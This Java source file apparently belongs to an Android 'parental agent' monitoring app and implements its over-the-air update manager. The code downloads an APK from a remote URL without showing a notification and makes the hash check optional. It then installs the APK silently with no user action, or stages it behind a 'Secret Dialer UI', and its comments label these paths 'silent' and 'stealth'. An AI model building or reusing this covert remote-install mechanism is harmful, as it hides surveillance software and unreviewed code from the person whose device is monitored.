package com.parental.agent.ota;

import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInstaller;
import android.os.Build;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class OtaUpdateManager {
    private static final String TAG = "OtaUpdateManager";
    private static final String PREFS_NAME = "ota_update_prefs";
    private static final String KEY_HAS_PENDING = "has_pending_update";
    private static final String KEY_PENDING_JOB_ID = "pending_job_id";
    private static final String KEY_PENDING_APK_PATH = "pending_apk_path";
    private static final String KEY_PENDING_VERSION = "pending_version";

    private static final ExecutorService executor = Executors.newSingleThreadExecutor();

    public interface OtaCallback {
        void onProgress(String jobId, String status, int progress, String error);
    }

    public static void downloadAndInstall(
            Context context,
            String apkUrl,
            String expectedSha256,
            String jobId,
            String versionName,
            OtaCallback callback
    ) {
        executor.execute(() -> {
            File destinationFile = new File(context.getCacheDir(), "ota_update_latest.apk");

            try {
                Log.d(TAG, "Starting silent download for OTA Update from: " + apkUrl);
                if (callback != null) callback.onProgress(jobId, "DOWNLOADING", 10, null);

                // 1. Silent Background Download (App-Private Storage, No Status Bar Download Icon)
                URL url = new URL(apkUrl);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                connection.setConnectTimeout(15000);
                connection.setReadTimeout(30000);
                connection.connect();

                if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {
                    throw new IOException("Server returned HTTP " + connection.getResponseCode());
                }

                int fileLength = connection.getContentLength();
                InputStream input = connection.getInputStream();
                OutputStream output = new FileOutputStream(destinationFile);

                byte[] data = new byte[8192];
                long total = 0;
                int count;
                while ((count = input.read(data)) != -1) {
                    total += count;
                    output.write(data, 0, count);
                    if (fileLength > 0 && callback != null) {
                        int progress = (int) ((total * 75) / fileLength) + 10;
                        callback.onProgress(jobId, "DOWNLOADING", progress, null);
                    }
                }

                output.flush();
                output.close();
                input.close();

                Log.d(TAG, "Download complete. Verifying SHA-256 Checksum...");
                if (callback != null) callback.onProgress(jobId, "VERIFYING", 88, null);

                // 2. Verify SHA-256 Integrity
                if (expectedSha256 != null && !expectedSha256.isEmpty()) {
                    String actualSha256 = calculateSha256(destinationFile);
                    if (!expectedSha256.equalsIgnoreCase(actualSha256)) {
                        throw new SecurityException("SHA-256 mismatch! Expected: " + expectedSha256 + ", Actual: " + actualSha256);
                    }
                }

                // 3. Determine Update Pathway (Silent Auto-Update vs Stealth Staging)
                DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                boolean isDeviceOwner = dpm != null && dpm.isDeviceOwnerApp(context.getPackageName());
                boolean isAndroid12OrHigher = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S;
                boolean canAutoUpdateSilently = isDeviceOwner || isAndroid12OrHigher;

                if (canAutoUpdateSilently) {
                    Log.d(TAG, "Pathway A: Silent Auto-Update supported (Device Owner: " + isDeviceOwner + ", Android 12+: " + isAndroid12OrHigher + "). Executing session...");
                    if (callback != null) callback.onProgress(jobId, "INSTALLING", 95, null);
                    executePackageInstallerSession(context, destinationFile, jobId);
                } else {
                    Log.d(TAG, "Pathway B: Stealth Staged Update. Saving APK for Secret Dialer UI trigger...");
                    savePendingUpdate(context, jobId, destinationFile.getAbsolutePath(), versionName);
                    if (callback != null) callback.onProgress(jobId, "STAGED_FOR_DIALER", 100, null);
                }

            } catch (Exception e) {
                Log.e(TAG, "OTA Update failed: " + e.getMessage(), e);
                if (callback != null) callback.onProgress(jobId, "FAILED", 0, e.getMessage());
            }
        });
    }

    public static void executePackageInstallerSession(Context context, File apkFile, String jobId) throws Exception {
        PackageInstaller packageInstaller = context.getPackageManager().getPackageInstaller();
        PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL
        );
        params.setAppPackageName(context.getPackageName());

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED);
        }

        int sessionId = packageInstaller.createSession(params);
        PackageInstaller.Session session = packageInstaller.openSession(sessionId);

        InputStream in = new FileInputStream(apkFile);
        OutputStream out = session.openWrite("package_update", 0, apkFile.length());
        byte[] buffer = new byte[65536];
        int bytesRead;
        while ((bytesRead = in.read(buffer)) != -1) {
            out.write(buffer, 0, bytesRead);
        }
        session.fsync(out);
        in.close();
        out.close();

        Intent intent = new Intent(context, OtaStatusReceiver.class);
        intent.putExtra("jobId", jobId);

        PendingIntent pendingIntent = PendingIntent.getBroadcast(
                context,
                0,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE
        );

        session.commit(pendingIntent.getIntentSender());
        Log.d(TAG, "PackageInstaller Session committed successfully. Session ID: " + sessionId);
    }

    // Helper methods for Stealth Staged Updates (Secret Dialer UI Trigger)
    public static void savePendingUpdate(Context context, String jobId, String apkPath, String version) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        prefs.edit()
                .putBoolean(KEY_HAS_PENDING, true)
                .putString(KEY_PENDING_JOB_ID, jobId)
                .putString(KEY_PENDING_APK_PATH, apkPath)
                .putString(KEY_PENDING_VERSION, version)
                .apply();
    }

    public static boolean hasPendingUpdate(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        boolean hasPending = prefs.getBoolean(KEY_HAS_PENDING, false);
        String path = prefs.getString(KEY_PENDING_APK_PATH, "");
        return hasPending && !path.isEmpty() && new File(path).exists();
    }

    public static String getPendingUpdateVersion(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        return prefs.getString(KEY_PENDING_VERSION, "v2.2.0");
    }

    public static void installPendingUpdate(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        String jobId = prefs.getString(KEY_PENDING_JOB_ID, "job_manual");
        String path = prefs.getString(KEY_PENDING_APK_PATH, "");

        if (!path.isEmpty()) {
            File apkFile = new File(path);
            if (apkFile.exists()) {
                executor.execute(() -> {
                    try {
                        executePackageInstallerSession(context, apkFile, jobId);
                    } catch (Exception e) {
                        Log.e(TAG, "Failed to launch manual update from Secret Dialer UI: " + e.getMessage(), e);
                    }
                });
            }
        }
    }

    public static void clearPendingUpdate(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        prefs.edit().clear().apply();
    }

    private static String calculateSha256(File file) throws Exception {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        FileInputStream fis = new FileInputStream(file);
        byte[] byteArray = new byte[8192];
        int bytesCount;
        while ((bytesCount = fis.read(byteArray)) != -1) {
            digest.update(byteArray, 0, bytesCount);
        }
        fis.close();

        byte[] bytes = digest.digest();
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }
}

